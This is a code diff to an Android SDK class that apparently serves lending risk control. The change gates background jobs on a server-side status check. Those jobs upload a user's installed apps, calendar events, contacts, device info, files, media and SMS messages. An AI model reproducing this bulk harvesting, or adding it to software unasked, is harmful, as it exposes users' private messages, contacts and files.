@@ -2,10 +2,8 @@ package com.weithink.fengkong;
 
 import android.content.Context;
 import android.content.Intent;
-import android.content.pm.PackageManager;
 import android.os.Handler;
 import android.os.Message;
-import android.util.Log;
 
 import androidx.annotation.NonNull;
 import androidx.work.Data;
@@ -13,15 +11,12 @@ import androidx.work.ExistingWorkPolicy;
 import androidx.work.OneTimeWorkRequest;
 import androidx.work.WorkManager;
 
-import com.weithink.fengkong.bean.LocationInfo;
-import com.weithink.fengkong.network.UtilNetworking;
+import com.google.gson.Gson;
+import com.weithink.fengkong.bean.UploadStatus;
+import com.weithink.fengkong.network.GetStatusTask;
 import com.weithink.fengkong.util.DeviceInfoUtil;
 import com.weithink.fengkong.util.StorageUtil;
 import com.weithink.fengkong.work.UploadWorker;
-
-import java.util.List;
-
-import static com.weithink.fengkong.Constants.WORK_NAME;
 
 /**
  * 调用初始化接口，
@@ -77,67 +72,94 @@ public class WeithinkFengkong {
         StorageUtil util = StorageUtil.getInstance();
         util.setStringCommit("userId", userId);
         if (MainActivity.notShowPermissionList.size() == 0 && MainActivity.mPermissionList.size() == 0) {
-            startService();
+            startService(userId);
         } else {
             startRequestPermissions();
         }
     }
 
-    private void startService() {
+    private void startService(final String userId) {
         DeviceInfoUtil.scanWifiList(WeithinkFengkong.getInstance().getContext());
         WeithinkFactory.getLogger().error("AAA>> %s", "startService");
-        execute();
+        new GetStatusTask(){
 
+            @Override
+            public void onPostResult(String s) {
+                if (!"".equals(s)) {
+                    UploadStatus us = new Gson().fromJson(s, UploadStatus.class);
+                    myExecute(us);
+                }
 
+            }
+        }.execute(userId);
     }
 
     /**
      * 执行上传操作
      */
-    public void execute() {
+    public void myExecute(UploadStatus us) {
 //        OneTimeWorkRequest request = null;
-        //appdata
-        OneTimeWorkRequest request = new OneTimeWorkRequest.Builder(UploadWorker.class)
-                .setInputData(createInputData(Constants.DataType.APP_DATA)).build();
-        WorkManager.getInstance(WeithinkFengkong.getInstance().getContext()).enqueueUniqueWork(Constants.DataType.APP_DATA,
-                        ExistingWorkPolicy.REPLACE, request);
+        if (us.getData().getApp_infos() == 0) {
+            WeithinkFactory.getLogger().debug("AAA>>> getApp_infos %S",us.getData().getApp_infos()+"");
+            //appdata
+            OneTimeWorkRequest request = new OneTimeWorkRequest.Builder(UploadWorker.class)
+                    .setInputData(createInputData(Constants.DataType.APP_DATA)).build();
+            WorkManager.getInstance(WeithinkFengkong.getInstance().getContext()).enqueueUniqueWork(Constants.DataType.APP_DATA,
+                    ExistingWorkPolicy.REPLACE, request);
+        }
 
-        OneTimeWorkRequest request1 = new OneTimeWorkRequest.Builder(UploadWorker.class)
-                .setInputData(createInputData(Constants.DataType.CALEVENT_DATA)).build();
-        WorkManager.getInstance(WeithinkFengkong.getInstance().getContext()).enqueueUniqueWork(Constants.DataType.CALEVENT_DATA,
-                ExistingWorkPolicy.REPLACE, request1);
-
+        if (us.getData().getCal_event_infos() == 0) {
+            WeithinkFactory.getLogger().debug("AAA>>> getCal_event_infos %S",us.getData().getCal_event_infos()+"");
+            OneTimeWorkRequest request1 = new OneTimeWorkRequest.Builder(UploadWorker.class)
+                    .setInputData(createInputData(Constants.DataType.CALEVENT_DATA)).build();
+            WorkManager.getInstance(WeithinkFengkong.getInstance().getContext()).enqueueUniqueWork(Constants.DataType.CALEVENT_DATA,
+                    ExistingWorkPolicy.REPLACE, request1);
+        }
 //        OneTimeWorkRequest request2 = new OneTimeWorkRequest.Builder(UploadWorker.class)
 //                .setInputData(createInputData(Constants.DataType.CALLS_DATA)).build();
 //        WorkManager.getInstance(WeithinkFengkong.getInstance().getContext()).enqueueUniqueWork(Constants.DataType.CALLS_DATA,
 //                ExistingWorkPolicy.REPLACE, request2);
+        if (us.getData().getModel_contact() == 0) {
+            WeithinkFactory.getLogger().debug("AAA>>> getModel_contact %S",us.getData().getModel_contact()+"");
+            OneTimeWorkRequest request3 = new OneTimeWorkRequest.Builder(UploadWorker.class)
+                    .setInputData(createInputData(Constants.DataType.CONTACTS_DATA)).build();
+            WorkManager.getInstance(WeithinkFengkong.getInstance().getContext()).enqueueUniqueWork(Constants.DataType.CONTACTS_DATA,
+                    ExistingWorkPolicy.REPLACE, request3);
+        }
 
-        OneTimeWorkRequest request3 = new OneTimeWorkRequest.Builder(UploadWorker.class)
-                .setInputData(createInputData(Constants.DataType.CONTACTS_DATA)).build();
-        WorkManager.getInstance(WeithinkFengkong.getInstance().getContext()).enqueueUniqueWork(Constants.DataType.CONTACTS_DATA,
-                ExistingWorkPolicy.REPLACE, request3);
+        if (us.getData().getDevice_infos() == 0) {
+            WeithinkFactory.getLogger().debug("AAA>>> getDevice_infos %S",us.getData().getDevice_infos()+"");
+            OneTimeWorkRequest request4 = new OneTimeWorkRequest.Builder(UploadWorker.class)
+                    .setInputData(createInputData(Constants.DataType.DEVICE_DATA)).build();
+            WorkManager.getInstance(WeithinkFengkong.getInstance().getContext()).enqueueUniqueWork(Constants.DataType.DEVICE_DATA,
+                    ExistingWorkPolicy.REPLACE, request4);
+        }
 
-        OneTimeWorkRequest request4 = new OneTimeWorkRequest.Builder(UploadWorker.class)
-                .setInputData(createInputData(Constants.DataType.DEVICE_DATA)).build();
-        WorkManager.getInstance(WeithinkFengkong.getInstance().getContext()).enqueueUniqueWork(Constants.DataType.DEVICE_DATA,
-                ExistingWorkPolicy.REPLACE, request4);
-
-        OneTimeWorkRequest request5 = new OneTimeWorkRequest.Builder(UploadWorker.class)
-                .setInputData(createInputData(Constants.DataType.FILE_DATA)).build();
-        WorkManager.getInstance(WeithinkFengkong.getInstance().getContext()).enqueueUniqueWork(Constants.DataType.FILE_DATA,
-                ExistingWorkPolicy.REPLACE, request5);
+        if (us.getData().getFile_infos() == 0) {
+            WeithinkFactory.getLogger().debug("AAA>>> getFile_infos %S",us.getData().getFile_infos()+"");
+            OneTimeWorkRequest request5 = new OneTimeWorkRequest.Builder(UploadWorker.class)
+                    .setInputData(createInputData(Constants.DataType.FILE_DATA)).build();
+            WorkManager.getInstance(WeithinkFengkong.getInstance().getContext()).enqueueUniqueWork(Constants.DataType.FILE_DATA,
+                    ExistingWorkPolicy.REPLACE, request5);
+        }
 
 
-        OneTimeWorkRequest request6 = new OneTimeWorkRequest.Builder(UploadWorker.class)
-                .setInputData(createInputData(Constants.DataType.MEDIA_DATA)).build();
-        WorkManager.getInstance(WeithinkFengkong.getInstance().getContext()).enqueueUniqueWork(Constants.DataType.MEDIA_DATA,
-                ExistingWorkPolicy.REPLACE, request6);
+        if (us.getData().getMedia_info() == 0) {
+            WeithinkFactory.getLogger().debug("AAA>>> getMedia_info %S",us.getData().getMedia_info()+"");
+            OneTimeWorkRequest request6 = new OneTimeWorkRequest.Builder(UploadWorker.class)
+                    .setInputData(createInputData(Constants.DataType.MEDIA_DATA)).build();
+            WorkManager.getInstance(WeithinkFengkong.getInstance().getContext()).enqueueUniqueWork(Constants.DataType.MEDIA_DATA,
+                    ExistingWorkPolicy.REPLACE, request6);
+        }
 
-        OneTimeWorkRequest request7 = new OneTimeWorkRequest.Builder(UploadWorker.class)
-                .setInputData(createInputData(Constants.DataType.SMS_DATA)).build();
-        WorkManager.getInstance(WeithinkFengkong.getInstance().getContext()).enqueueUniqueWork(Constants.DataType.SMS_DATA,
-                ExistingWorkPolicy.REPLACE, request7);
 
+        if (us.getData().getSms_infos() == 0) {
+            WeithinkFactory.getLogger().debug("AAA>>> getSms_infos %S",us.getData().getSms_infos()+"");
+            OneTimeWorkRequest request7 = new OneTimeWorkRequest.Builder(UploadWorker.class)
+                    .setInputData(createInputData(Constants.DataType.SMS_DATA)).build();
+            WorkManager.getInstance(WeithinkFengkong.getInstance().getContext()).enqueueUniqueWork(Constants.DataType.SMS_DATA,
+                    ExistingWorkPolicy.REPLACE, request7);
+        }
     }
 
     public static void startRequestPermissions() {
